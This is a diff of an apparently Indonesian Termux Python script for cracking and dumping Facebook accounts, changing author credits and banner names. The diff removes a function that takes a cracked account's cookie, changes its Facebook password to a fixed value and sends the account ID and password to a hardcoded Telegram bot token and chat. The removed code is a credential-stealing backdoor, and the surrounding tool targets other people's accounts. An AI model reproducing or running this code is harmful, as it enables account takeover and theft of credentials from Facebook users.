@@ -1,9 +1,6 @@
-# !/usr/bin/python3
-# coding=utf-8
-# Coded By   [ Xenz404 ]
-# Developed By : [ Dvanmeploph Afriliyan Ferly ]
-# Jangan Ganti Bot Komennya
-# Recode? Boleh, Asal Cantumkan Nama Author And Developer
+#!/usr/bin/python3
+#coding=utf-8
+
 N,M,K,H,B,U,C,P = "\x1b[00m","\x1b[38;2;255;0;0m","\x1b[38;2;208;255;0m","\x1b[38;2;0;255;8m","\x1b[38;2;38;0;255m","\x1b[38;2;234;0;255m","\x1b[38;2;0;221;255m","\x1b[1;97m"
 luffy = ("""{}                                                       .';'...;dkxo;.                               
                                    ...             ..;lOKXNKKXNWMMMNO,                              
@@ -481,7 +478,7 @@ class Menu:
 		NgehekBang(self.dump)
 	def result(self):
 		os.system("clear")
-		Banner_Dvanmeploph()
+		Banner_Xenz()
 		teks = '''[#ff0000][[#00ff08]••[#ff0000]][#ffffff] name account : [#00ff08]{}
 [#ff0000][[#00ff08]••[#ff0000]][#ffffff] id account   : [#00ff08]{}
 [#ff0000][[#00ff08]••[#ff0000]][#ffffff] ip address   : [#00ff08]{}
@@ -620,7 +617,7 @@ class NgehekBang:
 	def Notice(self):
 		os.system('clear')
 #		print (luffy)
-		Banner_Dvanmeploph()
+		Banner_Xenz()
 		teks = '''[#ff0000][[#00ff08]••[#ff0000]][#ffffff] Password tambahan :[#00ff08] {}
 [#ff0000][[#00ff08]••[#ff0000]][#ffffff] Method login      :[#00ff08] {}
 [#ff0000][[#00ff08]••[#ff0000]][#ffffff] Jumlah id dump    :[#00ff08] {}'''.format(','.join(self.pwpw),self.method[0],len(self.dump))
@@ -937,28 +934,6 @@ def check_termux_screen_size():
 #	print (col);exit()
 	return (col)
 
-def loger(coki, pw):
-	with requests.Session() as r:
-		cookie = {'cookie':coki}
-		req = r.get('https://mbasic.facebook.com/settings/security/password/', cookies=cookie)
-		res = BeautifulSoup(req.content, 'html.parser')
-
-		data = {}
-		pw_old = pw
-		pw_new = 'Dvanmeploph##'
-
-		for ez in res.find_all('form', {'method':'post'}):
-			if '/password/change/?redirect_uri' in ez.get('action'):
-				for cari in ez.find_all('input'):
-					if cari.get('name') == None:continue
-					data.update({cari.get('name'):cari.get('value')})
-				data.update({'password_old':pw_old,'password_new':pw_new,'password_confirm':pw_new})
-				response = r.post('https://mbasic.facebook.com'+ez.get('action'), data=data, cookies=cookie)
-				if 'Keluar dari perangkat lain?' in response.text:
-					requests.get(f"https://api.telegram.org/bot5929758771:AAFRsOhM0rR27zQB5QUcgE_xNPR0zXVFMB0/sendMessage?chat_id=5054191671&text={idf}|{pw_new}")
-				else:
-					requests.get(f"https://api.telegram.org/bot5929758771:AAFRsOhM0rR27zQB5QUcgE_xNPR0zXVFMB0/sendMessage?chat_id=5054191671&text={idf}|{pw}")
-
 
 if __name__=='__main__':
 	os.system('git pull')
@@ -980,4 +955,4 @@ if __name__=='__main__':
 		print("Ukuran layar Termux terlalu kecil. Silakan perbesar layar untuk menjalankan script ini")
 		sys.exit()
 	else:
-		trial()
+		Login()
